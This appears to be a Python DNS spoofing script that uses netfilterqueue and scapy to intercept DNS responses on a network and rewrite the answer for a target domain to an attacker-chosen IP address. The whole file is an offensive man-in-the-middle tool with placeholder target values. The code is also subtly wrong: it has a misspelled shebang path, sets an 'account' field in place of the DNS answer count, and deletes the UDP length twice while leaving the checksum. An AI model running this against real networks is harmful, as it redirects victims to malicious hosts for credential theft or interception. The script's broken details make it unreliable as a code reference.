#!/user/bin/env python

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # replace "website" ex. www.bing.com
        if "website" in str(qname):
            print("[+] Spoofing target")
            # replace "ip" ex. 10.0.2.16
            answer = scapy.DNSRR(rrname=qname, rdata="ip")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1
            # scapy will auto generate these deleted fields
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

        # print(scapy_packet.show())
    packet.accept()
    # packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
